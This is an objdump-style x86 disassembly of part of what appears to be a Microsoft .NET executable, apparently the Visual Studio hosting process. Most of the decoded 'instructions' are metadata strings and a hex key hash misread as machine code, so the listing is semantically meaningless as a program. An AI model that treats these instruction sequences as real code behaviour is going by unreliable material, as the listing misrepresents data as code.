  402775:	ins    DWORD PTR es:[edi],dx
  402776:	jo     0x4027e1
  402778:	ins    BYTE PTR es:[edi],dx
  402779:	gs jb  0x4027cf
  40277c:	gs jb  0x4027f5
  40277f:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  402786:	outs   dx,BYTE PTR ds:[esi]
  402787:	je     0x4027f2
  402789:	ins    DWORD PTR es:[edi],dx
  40278a:	gs inc ebx
  40278c:	outs   dx,DWORD PTR ds:[esi]
  40278d:	ins    DWORD PTR es:[edi],dx
  40278e:	jo     0x4027f1
  402790:	je     0x4027fb
  402792:	bound  ebp,QWORD PTR [ecx+0x6c]
  402795:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  40279d:	bound  esi,QWORD PTR [ebp+0x74]
  4027a0:	add    BYTE PTR gs:[ebx+0x79],dl
  4027a4:	jae    0x40281a
  4027a6:	gs ins DWORD PTR es:[edi],dx
  4027a8:	cs inc esp
  4027aa:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  4027b1:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  4027b8:	jne    0x402821
  4027ba:	addr16 popa 
  4027bc:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  4027c0:	je     0x402836
  4027c2:	jb     0x40282d
  4027c4:	bound  esi,QWORD PTR [ebp+0x74]
  4027c7:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  4027cc:	jne    0x402835
  4027ce:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  4027d6:	jae    0x4027d8
  4027d8:	inc    ebx
  4027d9:	outs   dx,DWORD PTR ds:[esi]
  4027da:	ins    DWORD PTR es:[edi],dx
  4027db:	jo     0x402846
  4027dd:	ins    BYTE PTR es:[edi],dx
  4027de:	popa   
  4027df:	je     0x40284a
  4027e1:	outs   dx,DWORD PTR ds:[esi]
  4027e2:	outs   dx,BYTE PTR ds:[esi]
  4027e3:	push   edx
  4027e4:	gs ins BYTE PTR es:[edi],dx
  4027e6:	popa   
  4027e7:	js     0x40284a
  4027e9:	je     0x402854
  4027eb:	outs   dx,DWORD PTR ds:[esi]
  4027ec:	outs   dx,BYTE PTR ds:[esi]
  4027ed:	jae    0x402830
  4027ef:	je     0x402865
  4027f1:	jb     0x40285c
  4027f3:	bound  esi,QWORD PTR [ebp+0x74]
  4027f6:	add    BYTE PTR gs:[esi+0x73],dh
  4027fa:	push   0x74736f
  4027ff:	inc    esp
  402800:	bound  esi,QWORD PTR gs:[ebp+0x67]
  402804:	addr16 gs jb 0x402856
  402808:	outs   dx,DWORD PTR ds:[esi]
  402809:	outs   dx,BYTE PTR ds:[esi]
  40280a:	push   ebp
  40280b:	jae    0x402872
  40280d:	jb     0x402852
  40280f:	outs   dx,DWORD PTR ds:[esi]
  402810:	fs gs inc ecx
  402813:	je     0x402889
  402815:	jb     0x402880
  402817:	bound  esi,QWORD PTR [ebp+0x74]
  40281a:	add    BYTE PTR gs:[ebp+0x69],cl
  40281e:	arpl   WORD PTR [edx+0x6f],si
  402821:	jae    0x402892
  402823:	data16 je 0x402854
  402826:	push   esi
  402827:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40282e:	jne    0x402894
  402830:	imul   ebp,DWORD PTR [edi+0x2e],0x74736f48
  402837:	imul   ebp,DWORD PTR [esi+0x67],0x636f7250
  40283e:	gs jae 0x4028b4
  402841:	cs push ebp
  402843:	je     0x4028ae
  402845:	ins    BYTE PTR es:[edi],dx
  402846:	imul   esi,DWORD PTR [ecx+ebp*2+0x65],0x79532e73
  40284e:	outs   dx,BYTE PTR ds:[esi]
  40284f:	arpl   WORD PTR [eax],ax
  402851:	push   ebx
  402852:	jns    0x4028c2
  402854:	arpl   WORD PTR [eax+0x72],bp
  402857:	outs   dx,DWORD PTR ds:[esi]
  402858:	outs   dx,BYTE PTR ds:[esi]
  402859:	imul   edi,DWORD PTR [edx+0x65],0x73795300
  402860:	je     0x4028c7
  402862:	ins    DWORD PTR es:[edi],dx
  402863:	cs push esp
  402865:	push   0x64616572
  40286a:	imul   ebp,DWORD PTR [esi+0x67],0x65764500
  402871:	outs   dx,BYTE PTR ds:[esi]
  402872:	je     0x4028cb
  402874:	popa   
  402875:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  40287d:	add    BYTE PTR [edi+0x65],ah
  402880:	je     0x4028e1
  402882:	dec    eax
  402883:	outs   dx,DWORD PTR ds:[esi]
  402884:	jae    0x4028fa
  402886:	imul   ebp,DWORD PTR [esi+0x67],0x636f7250
  40288d:	gs jae 0x402903
  402890:	dec    ecx
  402891:	outs   dx,BYTE PTR ds:[esi]
  402892:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40289a:	add    BYTE PTR fs:[ebx+0x65],dl
  40289e:	je     0x4028a0
  4028a0:	dec    ebp
  4028a1:	popa   
  4028a2:	outs   dx,BYTE PTR ds:[esi]
  4028a3:	jne    0x402906
  4028a5:	ins    BYTE PTR es:[edi],dx
  4028a6:	push   edx
  4028a7:	gs jae 0x40290f
  4028aa:	je     0x4028f1
  4028ac:	jbe    0x402913
  4028ae:	outs   dx,BYTE PTR ds:[esi]
  4028af:	je     0x4028b1
  4028b1:	addr16 gs je 0x402914
  4028b5:	push   ebx
  4028b6:	je     0x402919
  4028b8:	jb     0x40292e
  4028ba:	push   edx
  4028bb:	jne    0x40292b
  4028bd:	outs   dx,BYTE PTR ds:[esi]
  4028be:	imul   ebp,DWORD PTR [esi+0x67],0x72657355
  4028c5:	jae    0x402908
  4028c7:	jae    0x40293c
  4028c9:	gs ins DWORD PTR es:[edi],dx
  4028cb:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4028cf:	addr16 gs je 0x402932
  4028d3:	push   ebx
  4028d4:	push   0x6f647475
  4028d9:	ja     0x402949
  4028db:	push   eax
  4028dc:	jb     0x40294d
  4028de:	arpl   WORD PTR [ebp+0x73],sp
  4028e1:	jae    0x402928
  4028e3:	jbe    0x40294a
  4028e5:	outs   dx,BYTE PTR ds:[esi]
  4028e6:	je     0x4028e8
  4028e8:	push   ebx
  4028e9:	push   0x6f647475
  4028ee:	ja     0x40295e
  4028f0:	inc    ecx
  4028f1:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  4028f5:	outs   dx,BYTE PTR ds:[esi]
  4028f6:	add    BYTE PTR [edi+0x65],ah
  4028f9:	je     0x40295a
  4028fb:	push   ebx
  4028fc:	push   0x6f647475
  402901:	ja     0x402971
  402903:	add    BYTE PTR [edi+0x61],dl
  402906:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  40290e:	add    BYTE PTR [edi+0x61],dl
  402911:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x6e490079
  402919:	jbe    0x40298a
  40291b:	imul   esp,DWORD PTR [ebp+0x0],0x0
  40291f:	add    BYTE PTR [eax],al
  402921:	add    esp,DWORD PTR [eax]
  402923:	add    BYTE PTR [eax],al
  402925:	add    BYTE PTR [eax],al
  402927:	add    BYTE PTR [ebx],ah
  402929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40292a:	cmc    
  40292b:	stos   DWORD PTR es:[edi],eax
  40292c:	(bad)  
  40292d:	into   
  40292e:	or     BYTE PTR [eax-0x54],0xca
  402932:	icebp  
  402933:	leave  
  402934:	dec    eax
  402935:	out    dx,eax
  402936:	arpl   WORD PTR [ebx],ax
  402938:	add    BYTE PTR [eax],cl
  40293a:	mov    bh,0x7a
  40293c:	pop    esp
  40293d:	push   esi
  40293e:	sbb    DWORD PTR [eax+eiz*8],esi
  402941:	mov    DWORD PTR [ebx],eax
  402943:	and    BYTE PTR [eax],al
  402945:	add    DWORD PTR [ebx],eax
  402947:	add    BYTE PTR [eax],al
  402949:	add    DWORD PTR [eax+eiz*1],eax
  40294c:	add    DWORD PTR [ecx],eax
  40294e:	push   cs
  40294f:	add    al,0x20
  402951:	add    DWORD PTR [ecx],eax
  402953:	add    al,BYTE PTR ds:0xe010220
  402959:	push   cs
  40295a:	add    eax,0x11010120
  40295f:	push   ebp
  402960:	add    al,0x20
  402962:	add    DWORD PTR [ecx],eax
  402964:	or     BYTE PTR [eax+0x2400a0],al
  40296a:	add    BYTE PTR [eax+eax*4],al
  40296d:	add    BYTE PTR [eax],al
  40296f:	xchg   esp,eax
  402970:	add    BYTE PTR [eax],al
  402972:	add    BYTE PTR [esi],al
  402974:	add    al,BYTE PTR [eax]
  402976:	add    BYTE PTR [eax],al
  402978:	and    al,0x0
  40297a:	add    BYTE PTR [edx+0x53],dl
  40297d:	inc    ecx
  40297e:	xor    DWORD PTR [eax],eax
  402980:	add    al,0x0
  402982:	add    BYTE PTR [ecx],al
  402984:	add    BYTE PTR [ecx],al
  402986:	add    BYTE PTR [edi],al
  402988:	sar    edx,1
  40298a:	push   edi
  40298b:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  402991:	test   BYTE PTR [edx+0xdfdae0f],ch
  402997:	jmp    0xecab2784
  40299c:	pop    DWORD PTR [edi+0x6c7603fb]
  4029a2:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  4029a7:	mov    dl,0x3b
  4029a9:	out    0x9a,eax
  4029ab:	(bad)  
  4029ad:	fadd   st(1),st
  4029af:	fstp   QWORD PTR [edx+0x211336d2]
  4029b5:	add    dl,BYTE PTR [eax-0x6c38df5]
  4029bb:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  4029c2:	pop    esi
  4029c4:	pop    es
  4029c5:	ja     0x402a16
  4029c7:	sub    eax,ebp
  4029c9:	xor    cl,BYTE PTR [esi]
  4029cb:	xchg   edx,eax
  4029cc:	jmp    0xc021:0xe8e4ec05
  4029d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029d4:	out    dx,eax
  4029d5:	call   0x4c9c8ecb
  4029da:	or     al,0x93
  4029dc:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  4029e3:	stos   BYTE PTR es:[edi],al
  4029e4:	gs sub al,0x1d
  4029e7:	cli    
  4029e8:	(bad)  
  4029e9:	cmp    eax,0x2d6f5d74
  4029ee:	in     eax,0xf1
  4029f0:	jle    0x402a50
  4029f2:	scas   eax,DWORD PTR es:[edi]
  4029f3:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  4029fb:	inc    ebx
  4029fc:	sbb    BYTE PTR gs:[eax],ah
  4029ff:	ins    DWORD PTR es:[edi],dx
  402a00:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  402a07:	add    al,0x1
  402a09:	add    BYTE PTR [eax],al
  402a0b:	add    BYTE PTR [eax],cl
  402a0d:	mov    al,0x3f
  402a0f:	pop    edi
  402a10:	jg     0x402a23
  402a12:	aad    0xa
  402a14:	cmp    al,BYTE PTR [eax+eax*1]
  402a17:	add    BYTE PTR [edx],dl
  402a19:	add    esp,DWORD PTR gs:[eax]
  402a1c:	add    BYTE PTR [edx],al
  402a1e:	add    al,0x0
  402a20:	add    BYTE PTR [edx],dl
  402a22:	ins    DWORD PTR es:[edi],dx
  402a23:	add    al,0x0
  402a25:	add    BYTE PTR [edx],dl
  402a27:	jno    0x402a2f
  402a29:	add    BYTE PTR [ecx],al
  402a2b:	or     BYTE PTR ds:0x7087512,bl
  402a31:	add    bl,BYTE PTR ds:0x121d7512
  402a37:	jne    0x402a70
  402a39:	add    DWORD PTR [eax],eax
  402a3b:	sbb    ch,BYTE PTR [esi]
  402a3d:	dec    esi
  402a3e:	inc    ebp
  402a3f:	push   esp
  402a40:	inc    esi
  402a41:	jb     0x402aa4
  402a43:	ins    DWORD PTR es:[edi],dx
  402a44:	gs ja  0x402ab6
  402a47:	jb     0x402ab4
  402a49:	sub    al,0x56
  402a4b:	gs jb  0x402ac1
  402a4e:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  402a55:	xor    eax,0xe540001
  402a5a:	adc    al,0x46
  402a5c:	jb     0x402abf
  402a5e:	ins    DWORD PTR es:[edi],dx
  402a5f:	gs ja  0x402ad1
  402a62:	jb     0x402acf
  402a64:	inc    esp
  402a65:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  402a6c:	popa   
  402a6d:	ins    DWORD PTR es:[edi],dx
  402a6e:	add    BYTE PTR gs:0x1,al
  402a75:	add    BYTE PTR ds:0x10001,al
  402a7b:	add    BYTE PTR [edi],cl
  402a7d:	add    DWORD PTR [eax],eax
  402a7f:	or     dh,BYTE PTR [esi+0x73]
  402a82:	push   0x2e74736f
  402a87:	gs js  0x402aef
  402a8a:	add    BYTE PTR [eax],al
  402a8c:	sbb    al,BYTE PTR [ecx]
  402a8e:	add    BYTE PTR ds:0x7263694d,dl
  402a94:	outs   dx,DWORD PTR ds:[esi]
  402a95:	jae    0x402b06
  402a97:	data16 je 0x402aba
  402a9a:	inc    ebx
  402a9b:	outs   dx,DWORD PTR ds:[esi]
  402a9c:	jb     0x402b0e
  402a9e:	outs   dx,DWORD PTR ds:[esi]
  402a9f:	jb     0x402b02
  402aa1:	je     0x402b0c
  402aa3:	outs   dx,DWORD PTR ds:[esi]
  402aa4:	outs   dx,BYTE PTR ds:[esi]
  402aa5:	add    BYTE PTR [eax],al
  402aa7:	and    eax,0x4d200001
  402aac:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402ab3:	je     0x402a77
  402ab5:	scas   al,BYTE PTR es:[edi]
  402ab6:	and    BYTE PTR [esi+0x69],dl
  402ab9:	jae    0x402b30
  402abb:	popa   
  402abc:	ins    BYTE PTR es:[edi],dx
  402abd:	and    BYTE PTR [ebx+0x74],dl
  402ac0:	jne    0x402b26
  402ac2:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  402ac9:	xor    DWORD PTR [edx],esi
  402acb:	add    BYTE PTR [eax],al
  402acd:	xor    eax,DWORD PTR [ecx]
  402acf:	add    BYTE PTR [esi],ch
  402ad1:	ret    0x20a9
  402ad4:	dec    ebp
  402ad5:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402adc:	je     0x402afe
  402ade:	inc    ebx
  402adf:	outs   dx,DWORD PTR ds:[esi]
  402ae0:	jb     0x402b52
  402ae2:	outs   dx,DWORD PTR ds:[esi]
  402ae3:	jb     0x402b46
  402ae5:	je     0x402b50
  402ae7:	outs   dx,DWORD PTR ds:[esi]
  402ae8:	outs   dx,BYTE PTR ds:[esi]
  402ae9:	and    BYTE PTR cs:[ecx+0x6c],al
  402aed:	ins    BYTE PTR es:[edi],dx
  402aee:	and    BYTE PTR [edx+0x69],dh
  402af1:	addr16 push 0x72207374
  402af7:	gs jae 0x402b5f
  402afa:	jb     0x402b72
  402afc:	gs fs add BYTE PTR cs:[eax],al
  402b01:	adc    DWORD PTR [ecx],eax
  402b03:	add    BYTE PTR [ecx+esi*1],cl
  402b06:	xor    DWORD PTR [esi],ebp
  402b08:	xor    BYTE PTR [esi],ch
  402b0a:	xor    eax,0x37323730
  402b0f:	xor    DWORD PTR cs:[eax],eax
  402b12:	add    BYTE PTR ds:0x31080001,cl
  402b18:	xor    DWORD PTR [esi],ebp
  402b1a:	xor    BYTE PTR [esi],ch
  402b1c:	xor    BYTE PTR [esi],ch
  402b1e:	xor    BYTE PTR [eax],al
  402b20:	add    BYTE PTR [edx],cl
  402b22:	add    DWORD PTR [eax],eax
  402b24:	add    eax,0x552d6e65
  402b29:	push   ebx
  402b2a:	add    BYTE PTR [eax],al
  402b2c:	sub    al,BYTE PTR [ecx]
  402b2e:	add    BYTE PTR ds:0x645c3a46,ah
  402b34:	fs pop esp
  402b36:	je     0x402ba7
  402b38:	outs   dx,DWORD PTR ds:[esi]
  402b39:	ins    BYTE PTR es:[edi],dx
  402b3a:	jae    0x402b98
  402b3c:	fs gs jbe 0x402ba4
  402b40:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  402b47:	ins    BYTE PTR es:[edi],dx
  402b48:	push   eax
  402b49:	jne    0x402bad
  402b4b:	ins    BYTE PTR es:[edi],dx
  402b4c:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  402b53:	outs   dx,BYTE PTR ds:[esi]
  402b54:	imul   eax,DWORD PTR [eax],0x0
  402b57:	or     DWORD PTR [eax+0x1],0x0
  402b5b:	add    BYTE PTR [eax+0x30],0x30
  402b5f:	xor    dh,BYTE PTR [eax+esi*1]
  402b62:	xor    BYTE PTR [eax],dh
  402b64:	xor    BYTE PTR [eax],dh
  402b66:	arpl   WORD PTR [eax],di
  402b68:	xor    BYTE PTR [eax],dh
  402b6a:	xor    BYTE PTR [eax],dh
  402b6c:	xor    BYTE PTR [ecx],dh
  402b6e:	xor    al,0x30
  402b70:	xor    DWORD PTR [eax],esi
  402b72:	xor    BYTE PTR [eax],dh
  402b74:	xor    BYTE PTR [eax],dh
  402b76:	xor    BYTE PTR ss:[edx],dh
  402b79:	xor    BYTE PTR [eax],dh
  402b7b:	xor    BYTE PTR [eax],dh
  402b7d:	xor    BYTE PTR [eax],dh
  402b7f:	xor    dh,BYTE PTR [eax+esi*1]
  402b82:	xor    BYTE PTR [eax],dh
  402b84:	xor    BYTE PTR ds:0x34333532,dh
  402b8a:	xor    DWORD PTR [ebx],esi
  402b8c:	xor    DWORD PTR [eax],esi
  402b8e:	xor    BYTE PTR [eax],dh
  402b90:	cmp    BYTE PTR [eax],dh
  402b92:	xor    BYTE PTR [eax],dh
  402b94:	xor    BYTE PTR [eax],dh
  402b96:	xor    DWORD PTR [eax],esi
  402b98:	xor    BYTE PTR [eax],dh
  402b9a:	xor    DWORD PTR [eax],esi
  402b9c:	xor    BYTE PTR [esi],dh
  402b9e:	xor    DWORD PTR [ebx],esi
  402ba0:	xor    edi,DWORD PTR [ecx]
  402ba2:	cmp    DWORD PTR [ecx+0x66],esp
  402ba5:	xor    WORD PTR [eax],di
  402ba8:	xor    WORD PTR gs:[ecx+0x32],sp
  402bad:	arpl   WORD PTR [edx],si
  402baf:	xor    eax,0x32613431
  402bb4:	aaa    
  402bb5:	xor    esp,DWORD PTR [ecx+0x34]
  402bb8:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  402bbc:	xor    al,0x32
  402bbe:	bound  esi,QWORD PTR [edi]
  402bc0:	xor    dh,BYTE PTR [ebx]
  402bc2:	xor    dh,BYTE PTR [ecx]
  402bc4:	xor    WORD PTR [edi],si
  402bc7:	xor    eax,0x32303137
  402bcc:	cmp    WORD PTR fs:[ebp+0x62],sp
  402bd1:	popa   
  402bd2:	fs popa 
  402bd4:	cmp    DWORD PTR ss:[ecx],edi
  402bd7:	xor    dh,BYTE PTR [ebx]
  402bd9:	xor    dh,BYTE PTR gs:[edi]
  402bdc:	xor    edi,DWORD PTR [eax]
  402bde:	xor    al,0x30
  402be0:	arpl   WORD PTR ss:[edx],si
  402be3:	xor    DWORD PTR [ebp+0x35],esp
  402be6:	bound  edi,QWORD PTR [eax]
  402be8:	xor    BYTE PTR [ecx],dh
  402bea:	xor    eax,0x62613235
  402bef:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  402bf3:	xor    BYTE PTR [ecx+0x36],ah
  402bf6:	xor    eax,0x35333261
  402bfb:	xor    BYTE PTR gs:[eax],dh
  402bfe:	xor    DWORD PTR [ecx+0x63],esp
  402c01:	cmp    DWORD PTR [ecx+0x64],esp
  402c04:	arpl   WORD PTR [edx],si
  402c06:	xor    eax,0x38643266
  402c0b:	xor    DWORD PTR [ecx],esi
  402c0d:	bound  esi,QWORD PTR gs:[eax]
  402c10:	cmp    DWORD PTR [ecx+edi*1],esi
  402c13:	ss popa 
  402c15:	xor    al,0x63
  402c17:	ss popa 
  402c19:	xor    eax,0x36346439
  402c1e:	xor    DWORD PTR [ecx],edi
  402c20:	xor    eax,0x36633938
  402c25:	cmp    DWORD PTR [esi+0x35],esp
  402c28:	bound  esp,QWORD PTR [ecx+0x66]
  402c2b:	xor    BYTE PTR [ebx+0x34],ah
  402c2e:	xor    DWORD PTR [edi],esi
  402c30:	cmp    DWORD PTR [ecx+0x34],esp
  402c33:	aaa    
  402c34:	xor    esi,DWORD PTR [ecx]
  402c36:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  402c3a:	xor    eax,0x64633535
  402c3f:	xor    BYTE PTR [eax],dh
  402c41:	ss popa 
  402c43:	arpl   WORD PTR [ebx+0x38],sp
  402c46:	bound  esi,QWORD PTR ds:0x66393539
  402c4c:	xor    ah,BYTE PTR [edx+0x64]
  402c4f:	ss xor DWORD PTR gs:[eax],esi
  402c53:	xor    esi,DWORD PTR gs:[esi]
  402c56:	xor    BYTE PTR [ebx+0x33],ah
  402c59:	xor    al,0x35
  402c5b:	xor    esi,DWORD PTR [edi]
  402c5d:	popa   
  402c5e:	xor    DWORD PTR [edx+esi*1+0x36],esp
  402c62:	ss fs popa 
  402c65:	cmp    BYTE PTR [eax],dh
  402c67:	cmp    BYTE PTR ds:0x35363538,dh
  402c6d:	cmp    BYTE PTR [ebx],dh
  402c6f:	arpl   WORD PTR [eax],di
  402c71:	xor    eax,0x64313864
  402c76:	popa   
  402c77:	aaa    
  402c78:	xor    sp,WORD PTR [ebp+0x63]
  402c7c:	xor    BYTE PTR [ecx],dh
  402c7e:	gs cmp DWORD PTR fs:0x35633436,esi
  402c86:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  402c8a:	fs aaa 
  402c8c:	xor    DWORD PTR [ebx],esi
  402c8e:	arpl   WORD PTR [eax+esi*1+0x31],sp
  402c92:	aaa    
  402c93:	xor    ah,BYTE PTR [ebx+0x38]
  402c96:	xor    dh,BYTE PTR gs:[ebx]
  402c99:	popa   
  402c9a:	xor    DWORD PTR [eax],esi
  402c9c:	data16 xor BYTE PTR [edx],dh
  402c9f:	xor    edi,DWORD PTR [ecx]
  402ca1:	bound  edi,QWORD PTR [eax]
  402ca3:	xor    BYTE PTR [ebx+0x39],ah
  402ca6:	bound  esi,QWORD PTR ss:[eax]
  402ca9:	aaa    
  402caa:	aaa    
  402cab:	xor    esi,DWORD PTR [esi]
  402cad:	xor    ax,0x3864
  402cb1:	bound  esi,QWORD PTR [eax]
  402cb3:	xor    dh,BYTE PTR [edx]
  402cb5:	xor    eax,0x34613234
  402cba:	gs aaa 
  402cbc:	xor    al,0x32
  402cbe:	xor    eax,0x66356131
  402cc3:	xor    al,0x33
  402cc5:	xor    bh,BYTE PTR [eax]
  402cc7:	xor    dh,BYTE PTR [ebx+esi*1]
  402cca:	xor    DWORD PTR [eax],edi
  402ccc:	bound  esi,QWORD PTR [ebx]
  402cce:	xor    eax,0x35613933
  402cd3:	popa   
  402cd4:	xor    BYTE PTR [eax],bh
  402cd6:	aaa    
  402cd7:	data16 cmp BYTE PTR [ebp+0x35],ah
  402cdb:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  402cdf:	xor    DWORD PTR [ebx],esi
  402ce1:	xor    eax,0x61633966
  402ce6:	xor    al,0x37
  402ce8:	xor    sp,WORD PTR [edx+0x62]
  402cec:	xor    ah,BYTE PTR [ebp+0x31]
  402cef:	xor    BYTE PTR [ecx+0x66],ah
  402cf2:	data16 xor BYTE PTR [ecx+0x66],ah
  402cf6:	xor    BYTE PTR [eax],bh
  402cf8:	xor    al,0x39
  402cfa:	xor    eax,0x62663430
  402cff:	aaa    
  402d00:	arpl   WORD PTR [ebp+0x61],sp
  402d03:	xor    esp,DWORD PTR [esi+0x66]
  402d06:	xor    DWORD PTR [ecx],edi
  402d08:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  402d0c:	fs xor BYTE PTR gs:[ebp+0x64],ah
  402d11:	popa   
  402d12:	fs ss xor al,0x63
  402d16:	cmp    BYTE PTR ss:[ebp+0x66],ah
  402d1a:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  402d1f:	xor    eax,0x30336436
  402d24:	xor    ah,BYTE PTR [ecx+0x64]
  402d27:	xor    eax,0x36646635
  402d2c:	cmp    BYTE PTR gs:[eax],dh
  402d2f:	xor    si,WORD PTR [eax]
  402d32:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  402d36:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  402d3b:	cmp    DWORD PTR gs:0x38353633,esi
  402d42:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  402d4a:	bound  esi,QWORD PTR ds:0x63363366
  402d50:	xor    eax,0x66653234
  402d55:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  402d5a:	data16 cmp BYTE PTR [eax],bh
  402d5d:	cmp    BYTE PTR ds:0x33643833,dh
  402d63:	aaa    
  402d64:	xor    al,0x63
  402d66:	xor    WORD PTR gs:[eax],si
  402d6a:	ss popa 
  402d6c:	arpl   WORD PTR [esi+0x37],sp
  402d6f:	cmp    DWORD PTR fs:[ebx],esi
  402d72:	popa   
  402d73:	xor    al,0x34
  402d75:	xor    al,0x35
  402d77:	arpl   WORD PTR [ebx],si
  402d79:	arpl   WORD PTR [edi],si
  402d7b:	xor    esp,DWORD PTR [ebx+0x64]
  402d7e:	cmp    DWORD PTR [ecx],esi
  402d80:	xor    DWORD PTR [esi+0x30],esp
  402d83:	xor    eax,0x61613137
  402d88:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  402d8d:	fs popa 
  402d8f:	xor    DWORD PTR [edx],esi
  402d91:	bound  esi,QWORD PTR [ecx]
  402d93:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  402d97:	arpl   WORD PTR [ebx],si
  402d99:	aaa    
  402d9a:	xor    eax,0x813362
  402d9f:	popa   
  402da0:	xor    eax,0x36363861
  402da5:	xor    DWORD PTR gs:[ebp+0x65],esp
  402da9:	xor    DWORD PTR [eax],edi
  402dab:	data16 cmp BYTE PTR ss:[eax],dh
  402daf:	aaa    
  402db0:	ss cmp BYTE PTR ss:[edx],dh
  402db4:	xor    BYTE PTR [ecx],bh
  402db6:	xor    sp,WORD PTR [edx+0x31]
  402dba:	xor    DWORD PTR [edx],esi
  402dbc:	xor    esi,DWORD PTR [esi]
  402dbe:	popa   
  402dbf:	arpl   WORD PTR [ebp+0x35],sp
  402dc2:	xor    dh,BYTE PTR gs:[ecx]
  402dc5:	xor    WORD PTR [ecx],si
  402dc8:	aaa    
  402dc9:	cmp    BYTE PTR [eax],dh
  402dcb:	xor    esp,DWORD PTR [ecx+0x33]
  402dce:	xor    DWORD PTR [ebx+esi*1],esi
  402dd1:	popa   
  402dd2:	bound  esp,QWORD PTR [edx+0x31]
  402dd5:	xor    dh,BYTE PTR [esi]
  402dd7:	fs xor BYTE PTR fs:[ebx],dh
  402ddb:	xor    eax,0x32643764
  402de0:	data16 cmp BYTE PTR [edi],dh
  402de3:	bound  esi,QWORD PTR ss:[esi]
  402de6:	cmp    DWORD PTR [ebx],esi
  402de8:	cmp    BYTE PTR [ecx+0x61],ah
  402deb:	data16 xor ah,BYTE PTR [ebp+0x65]
  402def:	xor    esi,DWORD PTR [ecx+esi*1]
  402df2:	xor    al,0x64
  402df4:	xor    eax,0x64303234
  402df9:	aaa    
  402dfa:	xor    eax,0x31323633
  402dff:	xor    al,0x30
  402e01:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  402e05:	xor    al,0x61
  402e07:	xor    al,0x39
  402e09:	arpl   WORD PTR [eax+edi*1],si
  402e0c:	arpl   WORD PTR ss:[ebp+0x31],sp
  402e10:	xor    esi,DWORD PTR [ebx+esi*1]
  402e13:	xor    BYTE PTR [eax],dh
  402e15:	popa   
  402e16:	xor    dh,BYTE PTR [ecx]
  402e18:	xor    BYTE PTR [esi],dh
  402e1a:	popa   
  402e1b:	bound  esi,QWORD PTR fs:[esi]
  402e1e:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  402e22:	xor    esi,DWORD PTR [ebx]
  402e24:	xor    eax,0x65663039
  402e29:	data16 cmp BYTE PTR [ecx+0x64],ah
  402e2d:	xor    eax,0x63333463
  402e32:	bound  esp,QWORD PTR [ecx+0x38]
  402e35:	xor    dh,BYTE PTR [edx]
  402e37:	cmp    DWORD PTR [eax],esi
  402e39:	arpl   WORD PTR fs:[ecx+edi*1],si
  402e3d:	xor    eax,0x66653033
  402e42:	data16 cmp BYTE PTR fs:[esi],dh
  402e46:	xor    eax,0x39643332
  402e4b:	xor    al,0x38
  402e4d:	xor    esp,DWORD PTR [ebx+0x30]
  402e50:	xor    BYTE PTR [esi+0x34],ah
  402e53:	xor    eax,0x34666138
  402e58:	cmp    BYTE PTR ss:[ecx],bh
  402e5b:	xor    BYTE PTR [eax],dh
  402e5d:	xor    esi,DWORD PTR [esi]
  402e5f:	bound  esi,QWORD PTR [eax]
  402e61:	xor    ah,BYTE PTR gs:[ebx+0x36]
  402e65:	xor    DWORD PTR [eax+esi*1+0x37],esp
  402e69:	aaa    
  402e6a:	fs aaa 
  402e6c:	bound  sp,DWORD PTR [ecx+0x63]
  402e70:	xor    al,0x36
  402e72:	aaa    
  402e73:	popa   
  402e74:	xor    eax,0x62653630
  402e79:	popa   
  402e7a:	xor    bh,BYTE PTR [ecx]
  402e7c:	gs xor al,0x36
  402e7f:	aaa    
  402e80:	popa   
  402e81:	cmp    BYTE PTR [edi],dh
  402e83:	xor    DWORD PTR [ecx],edi
  402e85:	cmp    BYTE PTR [edx+0x30],ah
  402e88:	xor    eax,0x34376333
  402e8d:	cmp    DWORD PTR [ecx+0x61],esp
  402e90:	xor    ah,BYTE PTR [ecx+0x34]
  402e93:	xor    bh,BYTE PTR fs:[eax]
  402e96:	xor    al,0x30
  402e98:	arpl   WORD PTR [edi],si
  402e9a:	cmp    BYTE PTR [eiz*2+0x6436],dh
  402ea1:	push   ds
  402ea2:	add    DWORD PTR [eax],eax
  402ea4:	add    DWORD PTR [eax],eax
  402ea6:	push   esp
